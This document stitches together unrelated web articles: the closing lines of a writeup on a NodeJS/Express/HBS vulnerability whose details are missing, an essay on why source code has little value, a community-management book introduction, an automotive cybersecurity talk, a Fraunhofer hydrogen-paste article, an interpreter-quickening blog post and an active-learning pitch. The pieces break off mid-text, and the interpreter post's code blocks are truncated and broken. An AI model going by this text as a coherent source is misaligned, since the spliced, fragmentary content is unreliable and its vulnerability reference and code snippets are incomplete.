<p>Above I have described my observations on a potentially critical vulnerability in the Setup of <strong>NodeJS + Express + HBS</strong>. </p>
<p>As this setup is pretty common, I wanted this writeup to be out there. The handlebars engine particularly is very popular due to it’s support of HTML symantics. Everytime I work on a side-project, I quickly setup the boilerplate code with quick one liner of <a href="https://expressjs.com/en/starter/generator.html" target="_blank" rel="noopener">express-generator cli</a> <code>express --view hbs</code> and this creates the exact same stack the above issue is talking about.

      <article>
      

<p>Let me ask you a question: How much value do you think your source code has?</p>

<p>To answer this question, let me take you a few years back, when I worked with a small high tech startup. We were working on a pretty complex augmented reality system spanning all layers from low-level computer vision components to cross-platform mobile and web apps. Especially for the lower-level components, a good amount of research had been involved. We worked closely with an academic institute that specialized in computer vision.</p>

<p>In short, this project wasn’t something that anybody could just easily recreate. So one of the assumptions we had implicitly made was that our source code was one of the company’s major assets.</p>

<p>When we hired a new COO, who had mainly worked at bigger companies before, he was shocked to hear that all our code, communication infrastructure and internal systems were living in the cloud. He argued that we should move to on-premise solutions as soon as possible, partially out of fear of intellectual property theft, partially to appease investors with similar fears.</p>

<p>While I had no say in it, his arguments seemed somewhat unreasonable to me at the time and I couldn’t put my finger on it. But the CTO was on board. So we installed a cheapo server in one of our office’s closets, even though someone had just broken into our building earlier that month. We got rid of GitLab, and moved away from Slack and Trello in favor of an on-prem Jira installation. The whole ordeal took months to complete, and I’m guessing that all things considered, it cost the small company of ~6 people about half a year of development time. There was also the ongoing opportunity cost of no longer being able to use any new tools that involved the cloud.</p>

<p>But the whole thing got me thinking about an interesting question: What would happen if someone just took all our code? Going even further, what would happen if we ourselves just put it all on GitHub, with a permissive license like MIT? Short of making investors think we’re crazy, what direct impact would that have had on the company?</p>

<p>I thought long and hard about these questions, and I think in our situation back then, the answer would have been: absolutely none.</p>

<h2 id="your-source-code-is-worthless">Your source code is worthless</h2>

<p>Let’s face it, we were still a fast-moving startup, even if the above anecdote might give you the opposite picture. Our code was still changing drastically every couple weeks. Changes of the entire architecture or complete re-writes of components were not uncommon, as is usual for some early stage startups. And as you might expect in such a situation, the code wasn’t of the highest quality either: Half the time, the build would be broken. Testing and documentation were basically non-existent. It was unlikely that anyone from outside the team would even have gotten the thing up and running. Even if they did, it would be outdated a moment later.</p>

<p>One of the fears from management was that a big company like Google could take our code and build a competing service. After thinking about this in more detail, the idea now seems laughable to me: They would be much faster just building it themselves from scratch, than trying to understand the crummy code we had hacked together.</p>

<p>But let’s take a step back and assume the opposite for a moment: Beautifully written, clean code with complete test coverage. One-click build process. Exceptionally well-written documentation of the architecture and components. Would this have changed the situation? I really don’t think it would have.</p>

<p>You see, in 2017, there actually was an incident of a high profile source code theft: Panic, a company that makes high quality Mac and iOS software, had the full source code for most of their apps <a href="https://panic.com/blog/stolen-source-code" target="_blank">stolen by hackers</a>. While the attackers demanded a ransom to prevent the public release of the code, Panic refused to pay. They came to the conclusion that the worst thing that could happen would be people building cracked versions of their Apps, full of malware. But that was already happening anyways (as with most software), even before the source code was stolen. Don’t get me wrong, I’m sure this was a pretty bad blow for Panic, and I’m in no way arguing that source code theft can’t be damaging. But even Panic says in their blog post that they were not too concerned with competitors using their code either, mainly because it would quickly become outdated:</p>

<p><em>“That source is already missing a ton of fixes and improvements we committed over the last week alone, and six months from now it will be missing major critical new features. In short: it’s old and getting older.”</em></p>

<p>So maybe code by itself is not that valuable, and yet, software companies still have value. If the tangible aspects of the technology, the code and documentation, are not the main assets of a company, what is?</p>

<h3 id="what-is-programming">What is programming</h3>

<p>I couldn’t really wrap my head around the previous question until I stumbled upon a wonderful article, <a href="http://pages.cs.wisc.edu/~remzi/Naur.pdf" target="_blank">Programming as Theory Building</a>, written by none other than <a href="https://en.wikipedia.org/wiki/Turing_Award" target="_blank">Turing Award</a> winner <a href="https://en.wikipedia.org/wiki/Peter_Naur" target="_blank">Peter Naur</a>. If you’ve ever taken any formal computer science classes, you may have already heard his name: He’s the N in BNF, or Backus-Naur form, an important and widely-used notation for describing programming languages.</p>

<p>In the article, Naur describes his view of what programming really is. He argues that the main activity a programmer does is building a theory or model of the problem space in their head:</p>

<p><em>“[…] programming properly should be regarded as an activity by which the programmers form or achieve a certain kind of insight, a theory, of the matters at hand.”</em></p>

<p>He calls this view of programming the <em>“Theory Building View”</em> and puts it in contrast to what he calls the <em>“Production View”</em>, in which <em>“[…] programming is regarded as a production of a program and certain other texts.”</em></p>

<p>Naur argues that the production view, while it is widespread, contradicts many things we observe empirically in software projects. In contrast, the Theory Building View allows us to explain many phenomena, such as the observation I made in this article, that the source code itself holds little to no value.<sup id="fnref:naurwasfaster"><a href="#fn:naurwasfaster">1</a></sup> One of Naur’s main conclusions is that making changes to an existing program (to accommodate changing requirements) is often more costly than writing new code from scratch, at least if done by people from a different team. This is because there are intangible aspects of the model/theory in the programmer’s heads, which can’t be expressed in code and documentation:</p>

<p><em>“A main claim of the Theory Building View of programming is that an essential part of any program, the theory of it, is something that could not be conceivably expressed, but is inextricably bound to human beings.”</em></p>

<p>When a new team obtains the source code, they thus have to first re-build the original theory in their heads, which, Naur argues, can be more work than building their own theory from the ground up.</p>

<p>Naur brings multiple examples of real life product development where teams were asked to modify or extend a program, but couldn’t do it without help from the original development team, or otherwise they would be <em>“destroying its power and simplicity”</em>:</p>

<p><em>“[…] the program text and its documentation has proved insufficient as a carrier of some of the most important design ideas.”</em></p>

<p>Naur further says:</p>

<p><em>“The conclusion seems inescapable that at least with certain kinds of large programs, the continued adaptation, modification, and correction of errors in them, is essentially dependent on a certain kind of knowledge possessed by a group of programmers who are closely and continuously connected with them.”</em></p>

<p>Since this knowledge is inherently intangible, it can’t be communicated through the code or documentation - it has to be experienced anew by each new programmer joining the team. While the previous programmers can help new team members in this task, the code itself and any written documentation is not very useful in this process. What are these intangible elements/aspects?</p>

<h3 id="intangible-aspects-of-software">Intangible aspects of software</h3>

<p>According to Naur, there are three aspects that are difficult or impossible to express in any written form of code or documentation, and yet the original programmer can easily explain them:</p>

<p><strong>1)</strong> The programmer knows and understands the relationship of the real world problem and the program. They can explain how the details of the problem are mapped into the code and into additional documentation:
<em>“Thus the programmer must be able to explain, for each part of the program text and for each of its overall structural characteristics, what aspect or activity of the world is matched by it.”</em></p>

<p>While I think it’s possible in theory to make this knowledge more tangible through documentation, doing so exhaustively would be wholly impractical. And yet, Naur notes, an exhaustive understanding of the real world problem is necessary to understand the theory of the program:</p>

<p><em>“By far the largest part of the world will of course lie outside the scope of the program text, being irrelevant in the context. However, the decision that a part of the world is relevant can only be made by someone who understands the whole world. This understanding must be contributed by the programmer.”</em></p>

<p>Let me give you an example from my own experience. A few years back, I was working on a project that improved the processes of a production line in a factory. The workers there were still using paper checklists for quality assurance, making the process labor-intense and error prone. We replaced those paper checklists with a mobile app that runs on a tablet. While the app itself was fairly simple, the underlying business processes were complex - multiple different assembly lines and a variety of different machines were …</p></article></div></div></div></div>

This book is dedicated to our boy, Jack, who always keeps life in perspective.
</p></div><div><p><span><em>Most people are good people.</em></span></p><p>Grab a post-it note and write those words down and stick it on your wall. Doodle those words on your pencil case, make a wallpaper for your computer with them, or write them on a piece of paper and put it in your purse or wallet. Put them somewhere prominent that you will see every day, wherever you may be.</p><p>Good people do good things. They create things that make other people’s lives better, whether that is a song, a video, a joke, a game, a job, a healthier lifestyle, a sense of safety, or any one of a thousand other things. Good people contribute something of value to our society, and it strengthens us as individuals as well as a community.</p><p>One of the most wonderful aspects of having so many good people, is that we have so many different contributions to our society. Some contributions look like Battlefield 4, some like Lady Gaga, some like Hello Kitty, some like Modern China Bistro. In a society with a rich patchwork of contributions it is human nature that we will all have different ideas of which of those contributions we consider to be valuable and which are not.</p><p>Within this society of things it is easy for us to forget that <span><em>good people</em></span> create those things.</p><p>This book is about helping us to focus on good people creating good things, to preserve that spirit of sharing, and to protect against those whose primary contribution is obstruction and disrespect.</p><div><div><div><div><h2><a id="copilot"></a>Introducing Your Co-pilot</h2></div></div></div><p>Before we get started I should probably introduce myself.</p><p>My name is Jono and I am an Englishman living in California in the USA. I moved here to live with my beautiful wife, Erica, and we have subsequently had a wonderful little boy called Jack.</p><p>Over the last fourteen years or so I have developed a passion for communities who get together, often using the Internet, to create interesting things.</p><p>I first got interested in communities in 1998 when I discovered an entirely free Operating System for computers called Linux. The basic notion of Linux is that people around the world, mostly of the nerdy persuasion, work together on the Internet to create a system that is shared by everyone.</p><p>As such, Bob in Indiana could contribute something to the system today that could ultimately be shared by everyone tomorrow. Likewise, I could contribute something tomorrow that everyone can benefit from the day after. Everyone is welcome to contribute if they have something of value to offer; the community is driven by individual contributions that combine to represent something much bigger than any individual could create alone.</p><p>Now this is not a book about technology so I won’t bore you with the details of how this works; all you need to know is that people take time away from their families and friends to contribute their skills to make something that benefits the wider community.</p><p>When I first discovered this as a long-haired teenager in 1998, it absolutely captivated me. The notion of people who are merely connected by the Internet working together to create something that everyone can share and consume was mind-blowing to me. Without wishing to sound like an old fart, back in 1998 this was pretty much unheard of; all I heard back then, living in England, was the break-down of local communities and people not knowing their neighbors. Little did I expect that communities would be thriving online and creating interesting things together. Today this kind of sharing is far more commonplace.</p><p>Ever since that first introduction to the notion of communities, I have devoted the majority of my professional life to learning how to grow communities and help people to work together to create interesting things.</p><p>Professionally, I have gone on to become a community manager for one of the largest communities in the world, Ubuntu, which has hundreds of thousands of participants. I also provide consultancy services for many large organizations to help them grow internal and external communities. This has afforded me a fantastic opportunity not only to learn about growing communities but to also try different approaches and experiments in getting people excited about putting their brick in the wall.</p><p>Outside of work I have interests in music, podcasting, BBQ, and gaming, and with each of those interests I have created content and shared it with the wider community. This has ranged from releasing albums, to long-running podcasts, to building websites for tracking BBQ cooks, to broadcasting my gaming. With every one of these endeavors I have formed a community to be a part of growing, sharing, and enhancing the work that I started.</p><p>I have always believed that great communities are part of being human and the knowledge to grow them is something that should be shared freely so others can also create communities. To this end I wrote a book called <span><em>The Art of Community</em></span> which is available to buy or free to download from <a href="http://www.artofcommunityonline.org/" target="_top">http://www.artofcommunityonline.org</a>. I also organize community leadership events such as the annual <span><em>Community Leadership Summit</em></span> to continue to further the art and science of working together.</p><p>The summary of all this is that I am a community management nerd who loves playing heavy metal, smoking ribs, talking about interesting things on podcasts, and multi-player gaming. But what has this got to do with anything?</p></div><div><p>You may have subtly noticed in the biography that I just bored you all with that I wrote a book on community management called <span><em>The Art of Community</em></span>. This begs the rather obvious question of why I have written this book, and why I need to write a book on this particular subject.</p><p>Well, let me tell you a little story to set the scene.</p><p>When I was starting out in community management I wrote a fairly innocuous blog post on my website at <a href="http://www.jonobacon.org/" target="_top">http://www.jonobacon.org</a>. Not long after, I received an awfully mean-spirited and nasty comment: personal, full of vitriol, and entirely unnecessary.</p><p>As soon as I read it I became very self-reflective and worried that the statement may have represented the views of more than that one individual. In doing so, I entirely failed to balance the picture and consider the countless pleasant comments and wonderful email that I received. My mind zoned in on the negative.</p><p>In the midst of all of this, I logged on to discover a message from my friend Christian Schaller:</p><div><blockquote><p>Hey Jono. I saw that comment on your blog, you must be delighted!</p></blockquote></div><p>When I asked in what possible dimension that comment would make me happy, Christian responded with:</p><div><blockquote><p>For someone to write that it means that they care what you think, so much so they felt the need to write it on your website. Congratulations!</p></blockquote></div><p>In a strange and twisted way, Christian was right. When people care about something, it will often inspire them to take great lengths to protect it from something they disagree with.</p><p>Given that I have a fairly public facing position in the software world and work for a company that has made some controversial decisions from time to time, comments like that one on my blog were just the beginning.</p><p>In this role I am in a position of public representation for the company and the Ubuntu platform that the community and company builds. These controversial decisions were really pretty tame in the scheme of things; we were not devouring the planet of oil, we were not breaking the law, subjecting the elderly to freezing temperatures, or impoverishing the poor…we were merely making technical decisions that some people disagreed with.</p><p>From the outset most people threw the “whatever” gang sign (three fingers up (‘W’) and then slide them to the side (‘E’)) due to the fairly normal nature of software evolving, but to some of the vocal minority we were evil personified.</p><p>Some people in this vocal minority used about every possible combination of words to tell me to go screw myself, and for my employer to die in a fire. Some of these comments were so fueled with invective you would have imagined that we had sprinkled some razor-blades in their pet’s cat food for comedic effect, as opposed to deciding to simply make a set of technical choices they disagreed with.</p><p>Consequently, over the years I have developed something of a thick skin. This was not by choice; I needed to develop a thick skin to survive my path in life. If I was a wallflower I would never have been able to succeed in my chosen career path…I would have left the path either due to rampant insecurity or resentment of our critics.</p><p>Instead, I made a fairly conscious choice to manage how I process and interpret feedback from others with one primary overriding goal:</p><div><blockquote><p>Exercise modesty with the praise, be open to the feedback, and resilient to the haters.</p></blockquote></div><p>This has turned into a lifelong ambition and pursuit, and while I am certainly not perfect in responding this way in all cases, I am satisfied enough with my progress to feel like these efforts have made a substantive difference, not just in my career, but in my life too.</p><p>While I am thankful for being able to make these changes, I am intimately aware that the ability to do so was largely a result of my circumstances and the benefit of being thrown into an active community that I bear a responsibility to. Unfortunately, most people don’t have the luxury of such circumstances.</p><p>Hence the inspiration for this book.</p></div><div><p>Over …</p></div></div></div></div>

          <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p><span><span>As a pioneer in automotive cybersecurity, Thomas Wollinger has brought ESCRYPT from its beginnings in 2004 to a position as one of the world’s leading providers of system solutions for vehicle data security. </span><span>Today, ESCRYPT has some 400 associates at 19 locations worldwide and is part of the Bosch Group.

<p><span><span>Thomas Wollinger’s special focus lies on the strategic development and integration of ESCRYPT's product and solution portfolio. At <a href="https://www.fuzzcon.eu/event-recap-20201202" rel="noopener">FuzzCon - Automotive Edition</a> he took up a managerial perspective, to talk about some uncomfortable truths in automotive cybersecurity.</span><br></span></p>
<!--more-->

<p>At <a href="https://www.escrypt.com/en" rel="noopener">ESCRYPT</a>, we basically design, enable and manage IT security. As security consultants, we are specialized in security strategy, trainings and a variety of other fields within the automotive software domain. We consider ourselves experts in all kinds of testing methods, including functional testing, vulnerability scans, penetration testing, everything from automated testing to manual testing, and of course fuzzing.</p>
<p>In our testing efforts, we like to take a holistic approach, which means that we test electronic control units individually, but also the entire vehicle platform. Our goal is basically to secure the whole ecosystem of a connected car.</p>

<p><em>“In a connected world, cybersecurity is as important for your safety as the brakes” </em><em>– </em>Ralf Speth, CEO Jaguar/Land Rover</p>

<p>When I started with automotive security, we were securing all electronic control units (ECUs) individually. Since then, the complexity and connectivity of vehicles have increased dramatically, creating more opportunities for potential attackers to infiltrate those systems. This change requires a completely different approach and a new set of security skills. To sum up the key developments I have witnessed during my career, I have summarized 5 uncomfortable truths about automotive cybersecurity:</p>

<h2><strong>1. The Titanic Syndrome</strong></h2>
<p>In 2023, there will be 775.000.000 connected cars worldwide. The titanic syndrome states that those who put themselves in danger, will perish. In the development of increasingly software-driven connected vehicles, this means that those car manufacturers (OEMs) who don’t have a security strategy will not survive, as security can be seen as an indispensable foundation of interconnectivity.</p>
<p>However, the main challenge is that security vulnerabilities only become visible to the public when it's already too late. Customers usually don't notice when security is cut for profits (until their car fails them). And this is why there are still so many managers who see security primarily as a cost driver.<span></span></p>
<h3><span>What can you do?</span></h3>
<ul>
<li>Treat security as a strategic task</li>
<li>Create security awareness throughout the entire company</li>
<li>Enable security orchestration of the whole software development lifecycle</li>
</ul>

<h2><strong>2. No Safety without Security</strong></h2>
<p>Cyberattacks on vehicles have increased by a factor of seven over the last four years. Even if only a small number of those attacks are successful, the consequences can be devastating, especially as they are a potential threat to an entire fleet of vehicles.<span></span></p>
<h3><span><strong>What can you do?</strong></span></h3>
<ul>
<li>Use original equipment from trusted partners</li>
<li>Consider security during the entire lifecycle</li>
<li>Enable your team (IDS, SOC, Firewall)</li>
</ul>

<h2><strong>3. 100% Security is not affordable</strong></h2>
<p>There are 100 million lines of code (LoC) in the new Golf 8. For comparison, in a Boeing 787 there are only 14 Million LoC! Even if your team has an excellent bug detection rate, you will still, almost certainly, miss some bugs or vulnerabilities. The challenge here is balancing the risk and the investment, meaning that you will have to decide how much risk you are willing to take.</p>
<h3><span><strong>What can you do?</strong></span></h3>
<ul>
<li>Segment your car and define safety critical parts</li>
<li>Prioritize your security activities in the important fields<strong>&nbsp;</strong></li>
<li>Build resilient systems</li>
</ul>

<h2><strong>4. Omnipresent Threat</strong></h2>
<p>According to the <a href="https://www.bsi.bund.de/EN/Publications/SecuritySituation/SecuritySituation_node.html" rel="noopener">German Federal Office for Information Security (BSI)</a>, each day there are 322,000 new malware threats. <span><span>If you don't find those vulnerabilities first, someone else will exploit them. </span></span>The complexity of our systems is increasing dramatically. Since vehicles have quite a long lifecycle, the software complexity will increase even further while the car is on the road. This means that you will need to put in some extra effort to keep your car secure in the long run.</p>
<h3><span><strong>What can you do?</strong></span></h3>
<ul>
<li>Find the right strategy from the beginning</li>
<li>Protect all connected entities</li>
<li>Ensure long-term security&nbsp;</li>
</ul>

<h2><strong>5. Impending Sanctions</strong></h2>
<p>It's important to comply with new regulations such as the new<a href="https://www.escrypt.com/sites/default/files/2020-07/ECE-TRANS-WP29-2020-079-Revised-2.pdf" rel="noopener"> UNECE regulations</a> and the upcoming <a href="https://blog.code-intelligence.com/iso-21434-compliance"><span>ISO 21434. </span></a>Even if these norms aren't mandatory yet, OEMs who do not follow the rules will soon be disqualified. As if automotive software wasn’t complicated enough, these norms and regulations increase the complexity even further, which is why many developers perceive them as additional requirements.</p>
<p>Don’t get this wrong, regulations are very important to facilitate the use of effective security measures, but in some cases, they can lead to over-regulation. This means that complying with norms and standards becomes more important than the actual task at hand. Regulations certainly create pressure within the industry, but they can also be an opportunity, for example to convince the upper management to reassess their priorities. Security must come first!</p>
<h3><span><strong>What can you do?</strong></span></h3>
<ul>
<li>Hire legal experts</li>
<li>Implement standard-compliant security design</li>
<li>Implement a Cybersecurity Management System (CSMS)</li>
</ul>

<p><em>“Security is not a product, but a process” - </em>Bruce Schneier, Cryptographer &amp; Security Expert</p>

<p>I'm glad to see that testing methods such as <a href="https://blog.code-intelligence.com/the-magic-behind-feedback-based-fuzzing" rel="noopener">feedback-based fuzzing</a> are emerging as a new standard in the automotive sector. Nevertheless, we need to think about automotive security in a much broader way. The security perspective has to be kept in mind during the entire software development lifecycle (SDLC). This includes the management of processes, security strategy and company culture.</p>

		<p>Gasoline and diesel engines, which are powered by fossil fuels, will soon be sidelined by climate change. Instead, new propulsion systems will be required. One fuel with a big potential is hydrogen. Hydrogen vehicles are equipped with a reinforced tank that is fueled at a pressure of 700 bar. This tank feeds a fuel cell, which converts the hydrogen into electricity. This in turn drives an electric motor to propels the vehicle. In the case of passenger cars, this technology is well advanced, with several hundred hydrogen-powered automobiles already in operation on German roads. At the same time, the network of hydrogen stations in Germany is projected to grow from 100 to 400 over the next three years. Yet hydrogen is not currently an option for small vehicles such as electric scooters and motorcycles, since the pressure surge during refilling would be too great. Does this effectively shut out such vehicles from hydrogen technology?</p> 
<h4><b>POWERPASTE: the hydrogen technology for small vehicles</b></h4> 
<p>Not at all! Researchers from the Fraunhofer Institute for Manufacturing Technology and Advanced Materials IFAM in Dresden have now come up with a hydrogen-based fuel that is ideal for small vehicles: POWERPASTE, which is based on solid magnesium hydride. “POWERPASTE stores hydrogen in a chemical form at room temperature and atmospheric pressure to be then released on demand,” explains Dr. Marcus Vogt, research associate at Fraunhofer IFAM. And given that POWERPASTE only begins to decompose at temperatures of around 250 °C, it remains safe even when an e-scooter stands in the baking sun for hours. Moreover, refueling is extremely simple. Instead of heading to the filling station, riders merely have to replace an empty cartridge with a new one and then refill a tank with mains water. This can be done either at home or underway.</p> 
<p>The starting material of POWERPASTE is magnesium, one of the most abundant elements and, therefore, an easily available raw material. Magnesium powder is combined with hydrogen to form magnesium hydride in a process conducted at 350 °C and five to six times atmospheric pressure. An ester and a metal salt are then added in order to form the finished product. Onboard the vehicle, the POWERPASTE is released from a cartridge by means of a plunger. When water is added from an onboard tank, the ensuing reaction generates hydrogen gas in a quantity dynamically adjusted to the actual requirements of the fuel cell. In fact, only half of the hydrogen originates from the POWERPASTE; the rest comes from the added water. “POWERPASTE thus has a huge energy storage density,” says Vogt. “It is substantially higher than that of a 700 bar high-pressure tank. And compared to batteries, it has ten times the energy storage density.” This means that POWERPASTE offers a range comparable to – or even greater than – gasoline. And it also provides a higher range than compressed hydrogen at a pressure of 700 bar.</p> 
<h4><b>Suitable for e-scooters – and other applications as well</b></h4> 
<p>With its huge energy storage density, POWERPASTE is also an interesting option for cars, delivery vehicles and range extenders in battery-powered electric vehicles. Similarly, it could also significantly extend the flight time of large drones, which would thereby be able to fly for several hours rather than a mere 20 minutes. This would be especially useful for survey work, such as the inspection of forestry or power lines. In another kind of application, campers might also use POWERPASTE in a fuel cell to generate electricity to power a coffeemaker or toaster.</p> 
<h4><b>POWERPASTE helps overcome lack of infrastructure</b></h4> 
<p>In addition to providing a high operating range, POWERPASTE has another point in its favor. Unlike gaseous hydrogen, it does not require a costly infrastructure. This makes it ideal for areas lacking such an infrastructure. In places where there are no hydrogen stations, regular filling stations could therefore sell POWERPASTE in cartridges or canisters instead. The paste is fluid and pumpable. It can therefore be supplied by a standard filling line, using relatively inexpensive equipment. Initially, filling stations could supply smaller quantities of POWERPASTE – from a metal drum, for example – and then expand in line with demand. This would require capital expenditure of several tens of thousands of euros. By way of comparison, a filling station to pump hydrogen at high pressure currently costs between one and two million euros for each fuel pump. POWERPASTE is also cheap to transport, since no costly high-pressure tanks are involved nor the use of extremely cold liquid hydrogen.</p> 
<h4><b>Pilot center planned for 2021</b></h4> 
<p>Fraunhofer IFAM is currently building a production plant for POWERPASTE at the Fraunhofer Project Center for Energy Storage and Systems ZESS. Scheduled to go into operation in 2021, this new facility will be able to produce up to four tons of POWERPASTE a year – not only for e-scooters.</p></div></div>]]>

            <p>In my <a href="https://bernsteinbear.com/blog/inline-caching/">last post</a> I discussed inline caching as a
technique for runtime optimization. I ended the post with some extensions to
the basic technique, like <em>quickening</em>. If you have not read the previous post,
I recommend it. This post will make many references to it.</p>

<p>Quickening involves bytecode rewriting — self modifying code — to remove
some branches and indirection in the common path. Stefan Brunthaler writes
about it in his papers <a href="https://publications.sba-research.org/publications/dls10.pdf">Efficient Interpretation using Quickening</a>
and <a href="https://publications.sba-research.org/publications/ecoop10.pdf">Inline Caching Meets Quickening</a>.</p>

<h2 id="the-problem">The problem</h2>

<p>Let’s take a look at a fragment of the caching interpreter from the last post
so we can talk about the problem more concretely. You can also get the sources
<a href="https://github.com/tekknolagi/icdemo">from the repo</a> and open <code>interpreter.c</code>
in your preferred editor.</p>

<p>As I also mentioned last post, the <code>ADD</code> opcode handler has three cases to
handle:</p>

<ol>
  <li>Cache is empty</li>
  <li>Cache has the wrong key</li>
  <li>Cache has the right key</li>
</ol>

<p>Since Deutsch &amp; Schiffman found that types don’t vary that much, the third
case is the fast path case. This means that we should do as little as possible
in that case. And right now, we’re doing too much work.</p>

<p>Why should we have to check if the cache slot is empty if in the fast path it
shouldn’t be? And why should we then have to make an indirect call? On some
CPUs, indirect calls are <a href="https://bernsteinbear.com/blog/inline-caching-quickening/calls">much slower</a> than direct calls. And this
assumes the compiler generates a call instruction — it’s very possible that a
compiler would decide to inline the direct call.</p>

<p>Quickening is a technique that reduces the number of checks by explitly marking
state transitions in the bytecode.</p>

<h2 id="removing-the-empty-check">Removing the empty check</h2>

<p>In order to remove one of the checks — the <code>method == NULL</code> check — we can
add a new opcode, <code>ADD_CACHED</code>. The <code>ADD_CACHED</code> opcode can skip the check
because our interpreter will maintain the following invariant:</p>

<p><strong>Invariant:</strong> The opcode <code>ADD_CACHED</code> will appear in the bytecode stream <em>if
and only if</em> there is an entry in the cache at that opcode.</p>

<p>After <code>ADD</code> adds something to the cache, it can rewrite itself to <code>ADD_CACHED</code>.
This way, the next time around, we have satisfied the invariant.</p>

</code></pre></div></div>

<p>Not too different. We’ve shuffled the code around a little bit but overall it
looks fairly similar. We still get to share some code in <code>add_update_cache</code>, so
there isn’t too much duplication, either.</p>

<p>Now that we’ve moved the empty check, it’s time to remove the indirect call.</p>

<h2 id="removing-the-indirect-call">Removing the indirect call</h2>

<p>Let’s assume for a minute that you, the writer of a language runtime, know that
most of the time, when people write <code>a + b</code>, the operation refers to integer
addition.</p>

<p>Not many other primitive types implement addition. Frequently floating point
numbers use the same operator (though languages like OCaml do not). Maybe
strings. And maybe your language allows for overloading the plus operator. But
most people don’t do that. They add numbers.</p>

<p>In that case, you want to remove as much of the overhead as possible for adding
two numbers. So let’s introduce a new opcode, <code>ADD_INT</code> that is specialized for
integer addition.</p>

<p>In an ideal world, we would just be able to pop two objects, add them, and move
on. But in our current reality, we still have to deal with the possibility of
programmers passing in a non-integer every once in a while.</p>

<p>So first, we check if the types match. If they don’t, we populate the cache and
transition to <code>ADD_CACHED</code>. I’ll get to why we do that in a moment.</p>

<p>And if we did actually get an int, great, we call this new function
<code>do_add_int</code>.</p>

<p>This is a nice opcode handler for <code>ADD_INT</code>, but right now it’s orphaned. Some
opcode has to take the leap and rewrite itself to <code>ADD_INT</code>, otherwise it’ll
never get run.</p>

<p>I suggest we make <code>ADD</code> do the transition. This keeps <code>ADD_CACHED</code> fast for
other types. If <code>ADD</code> observes that the left hand side of the operation is an
integer, it’ll call <code>do_add_int</code> and rewrite itself.</p>

  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Back to “why transition from <code>ADD_INT</code> to <code>ADD_CACHED</code>”. Two thoughts:</p>

<ol>
  <li>
    <p>We could transition back to <code>ADD</code>. In that case, this code would perform
poorly in an environment where the programmer passes multiple different
types at this opcode. There would be a lot of bytecode rewriting overhead
going on as it goes back and forth between <code>ADD</code> and <code>ADD_INT</code>.</p>
  </li>
  <li>
    <p>We could also assume it’s a hiccup and <em>not</em> rewrite. This would perform
poorly if the first time the argument is an integer, but something else
every subsequent operation. There would be a lot of <code>lookup_method</code> calls.</p>
  </li>
</ol>

<p>A great extension here would be to add a polymorphic cache. Those are designed
to efficiently handle a small (less than five, normally) amount of repeated
types at a given point.</p>

<h2 id="why-is-this-faster">Why is this faster?</h2>

<p>Even if we leave the interpreter in this state, a small C bytecode interpreter,
we save a couple of instructions and some call overhead in the fast path of
integer addition. This is a decent win for math-heavy applications.</p>

<p>In the best case, though, we save a great deal of instructions. It’s entirely
possible that the compiler will optimize the entire body of <code>ADD_INT</code> to
something like:</p>

<div><div><pre><code>pop rax
pop rcx
cmp rax, $IntTag
jne slow_path
add rcx
push rcx
jmp next_opcode
slow_path:
; ...
</code></pre></div></div>

<p>It won’t look exactly like that, due to our object representation and because
our <code>push</code>/<code>pop</code> functions do not operate on the C call stack, but it will be a
little closer than before. But what if we could fix these issues and trim down
the code even further?</p>

<p>Then we might have something like the <a href="https://github.com/dart-lang/sdk/blob/b1c09ecd8f30adc02f7623f6137e07a51a648dc3/runtime/vm/compiler/backend/il_x64.cc#L3549">Dart intermediate
implementation</a> of addition for small integers on x86-64. The
following C++ code emits assembly for a specialized small integer handler:</p>

  <span>__</span> <span>addq</span><span>(</span><span>result</span><span>,</span> <span>right</span><span>);</span>
  <span>// ...</span>
<span>}</span>
</code></pre></div></div>

<p>This example is a little bit different since it is using an optimizing compiler
and assumes the input and output are both in registers, but still expresses the
main ideas.</p>

<p>See also the JVM <a href="https://github.com/openjdk/jdk/blob/a6d950587bc68f81495660f59169b7f1970076e7/src/hotspot/cpu/x86/templateTable_x86.cpp#L1338">template interpreter implementation</a> for binary
operations on small integers:</p>

<div><div><pre><code><span>void</span> <span>TemplateTable</span><span>::</span><span>iop2</span><span>(</span><span>Operation</span> <span>op</span><span>)</span> <span>{</span>
  <span>// ...</span>
  <span>__</span> <span>pop_i</span><span>(</span><span>rdx</span><span>);</span>
  <span>__</span> <span>addl</span> <span>(</span><span>rax</span><span>,</span> <span>rdx</span><span>);</span>
  <span>// ...</span>
<span>}</span>
</code></pre></div></div>

<p>which pops the top of the stack and adds <code>rax</code> to it. I think this is because
the JVM caches the top of the stack in the register <code>rax</code> at all times, but I
have not been able to confirm this. It would explain why it adds <code>rax</code> and why
there is no <code>push</code>, though.</p>

<p>There are a number of improvements that could be made to this very simple demo.
Bytecode rewriting can unlock a lot of performance gains with additional work.
I will list some of them below:</p></div></div>

    <div>
        <p>Data labelling is often the biggest bottleneck in machine learning — finding, managing and labelling vast quantities of data to build a sufficiently performing model can take weeks or months. Active learning lets you train machine learning models with <strong>much</strong> less labelled data. The best AI-driven companies, like <a href="https://www.youtube.com/watch?v=oBklltKXtDE&amp;feature=youtu.be&amp;t=475s">Tesla, already use active learning</a>. We think you should too.</p><h2 id="the-conventional-approach-vs-active-learning-creating-a-spam-filter">The conventional approach vs active learning - creating a spam filter</h2><p>Imagine that you wanted to build a spam filter for your emails. The conventional approach (<a href="http://www.paulgraham.com/spam.html">at least since 2002</a>) is to collect a large number of emails, label them as "spam" or "not spam" and then train a machine learning classifier to distinguish between the two classes. The conventional approach assumes all the data is equally valuable, but in most datasets there are class imbalances, noisy data and lots of redundancy.</p><blockquote><strong>The conventional approach wastes time labelling data that doesn't improve your model's performance. And you don't even know if your model is useful until you've finished labelling all the data.</strong></blockquote><p>Humans don't require thousands of randomly labelled examples to learn the difference between spam and legitimate email. If you were teaching a human to solve this task you'd expect to be able to give them a few examples of what you want, have them learn quickly and ask questions when they were unsure.</p><p>Active learning operates using the same intuition, using the model you're training to find and label only the most valuable data.</p><p>In active learning, you first provide a small number of labelled examples. The model is trained on this "seed" dataset. Then, the model "asks questions" by selecting the unlabeled data points it is unsure about, so the human can "answer" the questions by providing labels for those points. The model updates again and the process is repeated until the performance is good enough. <strong>By having the human iteratively teach the model, it's possible to make a better model, in less time, with much less labelled data.</strong></p><p>So how can the model find the next data point that needs labelling? Some commonly used methods are:</p><ol><li>select the data points where the model's predictive distribution has highest entropy</li><li>pick data points where the model's favored prediction is least confident</li><li>train an ensemble of models and focus on the data points where they disagree</li></ol><p>At Humanloop we actually use custom methods that 